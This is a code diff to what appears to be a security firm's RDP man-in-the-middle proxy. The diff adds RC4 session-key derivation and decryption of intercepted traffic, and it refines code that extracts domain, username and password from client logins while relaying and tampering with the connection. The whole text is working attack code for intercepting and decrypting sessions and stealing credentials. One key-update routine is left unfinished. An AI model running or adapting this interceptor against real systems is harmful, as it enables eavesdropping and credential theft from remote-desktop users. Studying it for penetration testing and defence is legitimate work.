@@ -13,7 +13,7 @@ Adrian Vollmer, SySS GmbH 2017
 import argparse
 import socket
 import ssl
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 import re
 from hexdump import hexdump
 import select
@@ -64,6 +64,36 @@ TERM_SIGN_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
                       # private exponent
     "e": [ 0x5b, 0x7b, 0x88, 0xc0 ] # public exponent
 }
+
+
+class RC4(object):
+    def __init__(self, key):
+        x = 0
+        self.sbox = list(range(256))
+        for i in range(256):
+            x = (x + self.sbox[i] + key[i % len(key)]) % 256
+            self.sbox[i], self.sbox[x] = self.sbox[x], self.sbox[i]
+        self.i = self.j = 0
+        self.encrypted_packets = 0
+
+
+    def decrypt(self, data):
+        if self.encrypted_packets >= 4096:
+            self.update_key()
+        out = []
+        for char in data:
+            self.i = (self.i + 1) % 256
+            self.j = (self.j + self.sbox[self.i]) % 256
+            self.sbox[self.i], self.sbox[self.j] = self.sbox[self.j], self.sbox[self.i]
+            out.append(char ^ self.sbox[(self.sbox[self.i] + self.sbox[self.j]) % 256])
+        self.encrypted_packets += 1
+        return bytes(bytearray(out))
+
+
+    def update_key(self):
+        print("Updating session keys...")
+        pad1 = b"\x36"*40
+        pad2 = b"\x5c"*48
 
 def substr(s, offset, count):
     return s[offset:offset+count]
@@ -182,13 +212,14 @@ def extract_client_random(bytes):
         #  bytes = f.read()
     global original_crypto
     global my_keys
-    for i in range(7,len(bytes)):
+    for i in range(7,len(bytes)-4):
         rand_len = bytes[i:i+4]
         if struct.unpack('<I', rand_len)[0] == len(bytes)-i-4:
             client_rand = bytes[i+4:]
             original_crypto["enc_client_rand"] = client_rand
             client_rand = rsa_decrypt(client_rand, my_keys["privkey"])
             original_crypto["client_rand"] = client_rand
+            generate_session_keys()
             return(b"Client random: " + hexlify(client_rand))
     return b""
 
@@ -210,7 +241,6 @@ def rsa_encrypt(bytes, key):
     e = key.e
     n = key.n
     c = pow(r, e, n)
-    print(key, r, c)
     return c.to_bytes(2048, "little").rstrip(b"\x00")
 
 
@@ -222,20 +252,134 @@ def rsa_decrypt(bytes, key):
     return m.to_bytes(2048, "little").rstrip(b"\x00")
 
 
+def is_fast_path(bytes):
+    return bytes[0] % 4 == 0 and bytes[1] in [len(bytes), 0x80]
+
+
+def decrypt(bytes, From="Client"):
+    cleartext = b""
+    if is_fast_path(bytes):
+        is_encrypted = (bytes[0] >> 7 == 1)
+        has_opt_length = (bytes[1] >= 0x80)
+        offset = 2
+        if has_opt_length:
+            offset += 1
+        if is_encrypted:
+            offset += 8
+            cleartext = rc4_decrypt(bytes[offset:], From=From)
+    else: # slow path
+        offset = 13
+        if len(bytes) < 13: return bytes
+        if bytes[offset] >= 0x80: offset += 1
+        offset += 1
+        security_flags = struct.unpack('<H', bytes[offset:offset+2])[0]
+        is_encrypted = (security_flags & 0x0008)# and not security_flags & 0x0080)
+        if is_encrypted:
+            offset += 12
+            cleartext = rc4_decrypt(bytes[offset:], From=From)
+
+    if not cleartext == b"":
+        #  print("Ciphertext: ")
+        #  hexdump(bytes[offset:offset+16])
+        print("Cleartext: ")
+        hexdump(cleartext)
+        # Removing security header and MAC
+        return bytes[:offset-12] + cleartext
+    else:
+        return bytes
+
+
+def sym_encryption_enabled():
+    global original_crypto
+    return ("original_crypto" in globals() and
+            not original_crypto["client_rand"] == b"")
+
+
+def generate_session_keys():
+    # Ch. 5.3.5.1
+    def salted_hash(s, i):
+        global original_crypto
+        sha1 = hashlib.sha1()
+        sha1.update(i + s + original_crypto["client_rand"] +
+                    original_crypto["server_rand"])
+        md5 = hashlib.md5()
+        md5.update(s + sha1.digest())
+        return md5.digest()
+
+    def final_hash(k):
+        global original_crypto
+        md5 = hashlib.md5()
+        md5.update(k + original_crypto["client_rand"] +
+                   original_crypto["server_rand"])
+        return md5.digest()
+
+    global original_crypto
+
+    # Non-Fips
+
+    pre_master_secret = (original_crypto["client_rand"][:24] +
+            original_crypto["server_rand"][:24])
+    master_secret = (salted_hash(pre_master_secret, b"A") +
+                     salted_hash(pre_master_secret, b"BB") +
+                     salted_hash(pre_master_secret, b"CCC"))
+    session_key_blob = (salted_hash(master_secret, b"X") +
+                        salted_hash(master_secret, b"YY") +
+                        salted_hash(master_secret, b"ZZZ"))
+    mac_key, server_encrypt_key, server_decrypt_key = [
+        session_key_blob[i*16:(i+1)*16] for i in range(3)
+    ]
+    server_encrypt_key = final_hash(server_encrypt_key)
+    server_decrypt_key = final_hash(server_decrypt_key)
+    client_encrypt_key = server_decrypt_key
+    client_decrypt_key = server_encrypt_key
+
+    original_crypto["mac_key"] = mac_key
+    original_crypto["server_encrypt_key"] = server_encrypt_key
+    original_crypto["server_decrypt_key"] = server_decrypt_key
+    original_crypto["client_encrypt_key"] = client_encrypt_key
+    original_crypto["client_decrypt_key"] = client_decrypt_key
+
+    # TODO handle shorter keys than 128 bit
+    print("Session keys generated")
+    init_rc4_sbox()
+
+
+def init_rc4_sbox():
+    print("Initializing RC4 s-box")
+    global RC4_CLIENT
+    global RC4_SERVER
+    global original_crypto
+    RC4_CLIENT = RC4(original_crypto["server_decrypt_key"])
+    RC4_SERVER = RC4(original_crypto["client_decrypt_key"])
+
+
+
+def rc4_decrypt(data, From="Client"):
+    global RC4_SBOX_CLIENT
+    global RC4_SBOX_SERVER
+
+    if From == "Client":
+        return RC4_CLIENT.decrypt(data)
+    else:
+        return RC4_SERVER.decrypt(data)
+
+
 def extract_credentials(bytes, m):
     # Client Info PDU
     # "0x0040 MUST be present"
     domlen, userlen, pwlen = [
-        struct.unpack('>H', binascii.unhexlify(x))[0]
+        struct.unpack('>H', unhexlify(x))[0]
         for x in m.groups()
     ]
     # TODO ordentlich machen
-    # TODO und locale+layout holen
-    offset = 36
-    domain = substr(bytes, offset, domlen).encode("utf-16")
-    user = substr(bytes, offset+domlen+2, userlen).encode("utf-16")
-    pw = substr(bytes, offset+domlen+2+userlen+2, pwlen).encode("utf-16")
-    return (b"%s\\%s:%s" % (domain.decode(), user.decode(), pw.decode()))
+    offset = 37
+    if domlen + userlen + pwlen < len(bytes):
+        domain = substr(bytes, offset, domlen).decode("utf-16")
+        user = substr(bytes, offset+domlen+2, userlen).decode("utf-16")
+        pw = substr(bytes, offset+domlen+2+userlen+2, pwlen).decode("utf-16")
+        return (b"%s\\%s:%s" % (domain.encode(), user.encode(), pw.encode()))
+    else:
+        return b""
 
 
 def extract_keyboard_layout(bytes):
@@ -303,7 +447,26 @@ def sign_certificate(bytes):
     return s.to_bytes(len(original_crypto["sign"]), "little")
 
 
-def parse_rdp(bytes):
+def parse_rdp(bytes, From="Client"):
+    if bytes[:2] == b"\x03\x00":
+        while not bytes == b"":
+            length = struct.unpack('>H', bytes[2:4])[0]
+            parse_rdp_packet(bytes[:length], From=From)
+            bytes = bytes[length:]
+    else: # fast path?
+        while not bytes == b"":
+            length = bytes[1]
+            if length >= 0x80:
+                length = struct.unpack('>H', bytes[1:3])[0]
+                length -= 0x80*0x100
+            parse_rdp_packet(bytes[:length], From=From)
+            bytes = bytes[length:]
+
+
+def parse_rdp_packet(bytes, From="Client"):
+
+    if sym_encryption_enabled():
+        bytes = decrypt(bytes, From=From)
 
     result = b""
     # hexlify first because \x0a is a line break and regex works on single
@@ -341,16 +504,15 @@ def parse_rdp(bytes):
     if m:
         result = extract_server_cert(bytes)
 
-    regex = b".*0d00.{178}0000"
+    regex = b".*0d00.{178}0000" ## TODO
     m = re.match(regex, hexlify(bytes))
     if m:
-        result = extract_keyboard_layout(bytes)
+        #  result = extract_keyboard_layout(bytes)
+        pass
 
 
-    keypress_regex = b"\x03\x00\x001|\x44\x04.."
-    m = re.match(keypress_regex, bytes)
-    if m:
-        result = extract_key_press(bytes)
+    #  if is_fast_path(bytes):
+        #  result = extract_key_press(bytes)
 
     #  keymap_regex = b".*en-us.*" # TODO find keymap definition
     #  (CLIENT_CORE_DATA)
@@ -403,6 +565,7 @@ def set_fake_requested_protocol(bytes, m):
 
 
 def downgrade_auth(bytes):
+    # TODO put in tamper_data
     cred_regex = b".*..00..00.{8}$"
     m = re.match(cred_regex, hexlify(bytes))
     global RDP_PROTOCOL
@@ -482,7 +645,7 @@ def forward_data():
                     data += s_in.recv(4096)
             if data == b"": return close()
             dump_data(data, From="Client")
-            parse_rdp(data)
+            parse_rdp(data, From="Client")
             data = tamper_data(data)
             remote_socket.send(data)
         elif s_in == remote_socket:
@@ -492,7 +655,7 @@ def forward_data():
                     data += s_in.recv(4096)
             if data == b"": return close()
             dump_data(data, From="Server")
-            parse_rdp(data)
+            parse_rdp(data, From="Server")
             data = tamper_data(data)
             local_conn.send(data)
     return True
